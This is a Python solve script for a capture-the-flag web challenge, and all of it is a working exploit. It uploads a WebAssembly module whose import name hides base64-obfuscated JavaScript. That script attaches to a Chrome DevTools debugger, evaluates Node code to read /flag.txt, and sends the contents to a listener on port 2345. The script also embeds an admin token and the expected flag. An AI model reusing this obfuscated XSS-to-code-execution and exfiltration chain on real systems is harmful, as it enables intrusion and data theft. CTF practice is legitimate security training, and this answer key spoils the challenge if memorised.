#!/usr/bin/env python3

import socket
import requests
import os
import time
import codecs

SITE_URL = "http://127.0.0.1:1337"
ADMIN_TOKEN = "dee54036-d87e-4ba0-a2a8-118b32641f5d"
EXPECTED_FLAG = "uiuctf{https://youtu.be/17ocaZb-bGg}"

# see browser_solve.js for more readable explanation

debuggerfn = requests.put(SITE_URL + "/upload",
    headers={"content-type": "application/wasm"},
    data=bytearray([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 96, 2, 127, 127, 0, 96, 0, 0, 2, 17, 1, 7, 112, 114, 111, 99, 101, 115, 115, 5, 95, 107, 105, 108, 108, 0, 0, 3, 2, 1, 1, 7, 8, 1, 4, 109, 97, 105, 110, 0, 1, 10, 15, 1, 13, 0, 65, 0, 65, 10, 16, 0, 3, 64, 12, 0, 11, 11])
).text

pagefn = requests.put(SITE_URL + "/upload",
    headers={"content-type": "application/wasm"},
    data=bytearray([0,97,115,109,1,0,0,0,1,5,1,96,1,127,0,2,145,18,1,7,112,114,111,99,101,115,115,132,18,60,115,99,114,105,112,116,62,101,118,97,108,40,97,116,111,98,40,39,89,88,78,53,98,109,77,103,75,71,82,108,89,110,86,110,90,50,86,121,90,109,52,112,73,68,48,43,73,72,115,75,73,67,65,103,73,67,65,103,73,67,65,118,76,121,65,57,80,84,48,103,90,88,104,108,89,51,86,48,90,87,81,103,97,87,52,103,100,71,104,108,73,72,66,104,90,50,85,75,73,67,65,103,73,67,65,103,73,67,66,106,98,50,53,122,100,67,66,121,90,88,78,119,98,50,53,122,90,83,65,57,73,71,70,51,89,87,108,48,73,71,90,108,100,71,78,111,75,67,73,118,99,110,86,117,76,121,73,103,75,121,66,107,90,87,74,49,90,50,100,108,99,109,90,117,75,84,115,75,73,67,65,103,73,67,65,103,73,67,66,106,98,50,53,122,100,67,66,121,90,87,70,107,90,88,73,103,80,83,66,121,90,88,78,119,98,50,53,122,90,83,53,105,98,50,82,53,76,109,100,108,100,70,74,108,89,87,82,108,99,105,103,112,79,119,111,103,73,67,65,103,73,67,65,103,73,71,120,108,100,67,66,105,100,87,89,103,80,83,65,105,73,106,115,75,73,67,65,103,73,67,65,103,73,67,66,115,90,88,81,103,90,71,86,105,100,87,100,110,90,88,74,49,99,109,119,55,67,105,65,103,73,67,65,103,73,67,65,103,100,50,104,112,98,71,85,103,75,68,69,112,73,72,115,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,89,50,57,117,99,51,81,103,101,50,82,118,98,109,85,115,73,72,90,104,98,72,86,108,102,83,65,57,73,71,70,51,89,87,108,48,73,72,74,108,89,87,82,108,99,105,53,121,90,87,70,107,75,67,107,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,71,108,109,73,67,104,107,98,50,53,108,75,83,66,105,99,109,86,104,97,122,115,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,89,110,86,109,73,67,115,57,73,71,53,108,100,121,66,85,90,88,104,48,82,71,86,106,98,50,82,108,99,105,103,112,76,109,82,108,89,50,57,107,90,83,104,50,89,87,120,49,90,83,107,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,71,108,109,73,67,104,105,100,87,89,117,97,87,53,106,98,72,86,107,90,88,77,111,73,108,120,117,73,105,107,112,73,72,115,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,56,118,73,71,82,108,89,110,86,110,90,50,86,121,73,72,78,48,89,88,82,108,98,87,86,117,100,67,66,112,99,121,66,107,98,50,53,108,76,67,66,112,98,87,49,108,90,71,108,104,100,71,86,115,101,83,66,105,99,109,86,104,97,119,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,76,121,56,103,75,72,100,108,73,71,104,104,100,109,85,103,98,50,53,115,101,83,66,118,98,109,85,103,99,50,86,106,98,50,53,107,76,67,66,112,90,105,66,121,90,88,70,49,90,88,78,48,73,71,86,117,90,72,77,103,100,50,85,103,89,88,74,108,73,71,70,115,99,109,86,104,90,72,107,103,100,71,57,118,73,71,120,104,100,71,85,112,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,107,90,87,74,49,90,50,100,108,99,110,86,121,98,67,65,57,73,71,74,49,90,105,53,122,99,71,120,112,100,67,103,105,82,71,86,105,100,87,100,110,90,88,73,103,98,71,108,122,100,71,86,117,97,87,53,110,73,71,57,117,73,67,73,112,76,110,66,118,99,67,103,112,76,110,78,119,98,71,108,48,75,67,74,99,98,105,73,112,76,110,78,111,97,87,90,48,75,67,107,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,105,99,109,86,104,97,122,115,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,102,81,111,103,73,67,65,103,73,67,65,103,73,72,48,75,73,67,65,103,73,67,65,103,73,67,65,118,76,121,66,106,99,109,57,122,99,121,66,107,98,50,49,104,97,87,52,103,100,50,86,105,99,50,57,106,97,50,86,48,67,105,65,103,73,67,65,103,73,67,65,103,98,71,86,48,73,72,100,122,73,68,48,103,98,109,86,51,73,70,100,108,89,108,78,118,89,50,116,108,100,67,104,107,90,87,74,49,90,50,100,108,99,110,86,121,98,67,107,55,67,105,65,103,73,67,65,103,73,67,65,103,76,121,56,103,97,72,82,48,99,72,77,54,76,121,57,106,97,72,74,118,98,87,86,107,90,88,90,48,98,50,57,115,99,121,53,110,97,88,82,111,100,87,73,117,97,87,56,118,90,71,86,50,100,71,57,118,98,72,77,116,99,72,74,118,100,71,57,106,98,50,119,118,100,71,57,48,76,49,74,49,98,110,82,112,98,87,85,118,67,105,65,103,73,67,65,103,73,67,65,103,100,51,77,117,98,50,53,118,99,71,86,117,73,68,48,103,75,67,107,103,80,84,52,103,101,119,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,51,99,121,53,122,90,87,53,107,75,69,112,84,84,48,52,117,99,51,82,121,97,87,53,110,97,87,90,53,75,72,115,105,97,87,81,105,79,106,65,115,73,109,49,108,100,71,104,118,90,67,73,54,73,108,74,49,98,110,82,112,98,87,85,117,90,88,90,104,98,72,86,104,100,71,85,105,76,67,65,105,99,71,70,121,89,87,49,122,73,106,112,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,105,90,88,104,119,99,109,86,122,99,50,108,118,98,105,73,54,73,67,73,111,73,105,65,114,73,67,103,111,75,83,65,57,80,105,66,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,76,121,56,103,80,84,48,57,73,71,86,52,90,87,78,49,100,71,86,107,73,71,108,117,73,72,78,104,98,109,82,105,98,51,103,117,97,110,77,103,97,87,52,103,98,109,57,107,90,81,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,56,118,73,71,108,117,99,50,108,107,90,83,66,117,99,50,112,104,97,87,119,103,100,50,85,103,89,50,70,117,74,51,81,103,98,87,70,114,90,83,66,117,90,88,82,51,98,51,74,114,73,72,74,108,99,88,86,108,99,51,82,122,76,67,66,122,98,121,66,108,101,71,90,112,98,72,82,121,89,88,82,108,73,72,82,111,99,109,57,49,90,50,103,103,99,51,82,107,98,51,86,48,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,89,50,57,117,99,51,81,103,90,110,77,103,80,83,66,121,90,88,70,49,97,88,74,108,75,67,74,109,99,121,73,112,79,119,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,72,74,108,100,72,86,121,98,105,66,109,99,121,53,121,90,87,70,107,82,109,108,115,90,86,78,53,98,109,77,111,73,105,57,109,98,71,70,110,76,110,82,52,100,67,73,112,76,110,82,118,85,51,82,121,97,87,53,110,75,67,107,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,57,75,83,53,48,98,49,78,48,99,109,108,117,90,121,103,112,73,67,115,103,73,105,107,111,75,83,73,115,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,105,97,87,53,106,98,72,86,107,90,85,78,118,98,87,49,104,98,109,82,77,97,87,53,108,81,86,66,74,73,106,111,103,100,72,74,49,90,81,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,57,102,83,107,112,79,119,111,103,73,67,65,103,73,67,65,103,73,72,48,55,67,105,65,103,73,67,65,103,73,67,65,103,100,51,77,117,98,50,53,116,90,88,78,122,89,87,100,108,73,68,48,103,75,71,86,50,90,87,53,48,75,83,65,57,80,105,66,55,67,105,65,103,73,67,65,103,73,67,65,103,73,67,65,103,73,71,78,118,98,110,78,118,98,71,85,117,98,71,57,110,75,71,86,50,90,87,53,48,76,109,82,104,100,71,69,112,79,119,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,66,106,98,50,53,122,100,67,66,107,89,88,82,104,73,68,48,103,83,108,78,80,84,105,53,119,89,88,74,122,90,83,104,108,100,109,86,117,100,67,53,107,89,88,82,104,75,84,115,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,97,87,89,103,75,67,70,107,89,88,82,104,76,110,74,108,99,51,86,115,100,67,107,103,99,109,86,48,100,88,74,117,79,119,111,103,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,118,76,121,66,108,101,71,90,112,98,72,82,121,89,88,82,108,73,71,90,115,89,87,99,75,73,67,65,103,73,67,65,103,73,67,65,103,73,67,65,103,100,50,108,117,90,71,57,51,76,109,120,118,89,50,70,48,97,87,57,117,73,68,48,103,73,109,104,48,100,72,65,54,76,121,56,120,77,106,99,117,77,67,52,119,76,106,69,54,77,106,77,48,78,84,56,105,73,67,115,103,90,71,70,48,89,83,53,121,90,88,78,49,98,72,81,117,99,109,86,122,100,87,120,48,76,110,90,104,98,72,86,108,79,119,111,103,73,67,65,103,73,67,65,103,73,72,48,55,67,105,65,103,73,67,65,103,73,72,48,61,39,41,41,40,39]) + debuggerfn.encode() + bytearray([39,41,60,47,115,99,114,105,112,116,62,0,0])
).text

print("http://localhost:3000/run/" + pagefn)

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(("0.0.0.0", 2345))
serversocket.listen(1)

print(requests.post(SITE_URL + "/report", data={
    "url": SITE_URL + "/run/" + pagefn,
    "healthcheck_captcha_bypass": ADMIN_TOKEN
}).text)

(clientsocket, address) = serversocket.accept()
data = clientsocket.recv(50)

assert EXPECTED_FLAG.encode("utf8") in data

print("Done")
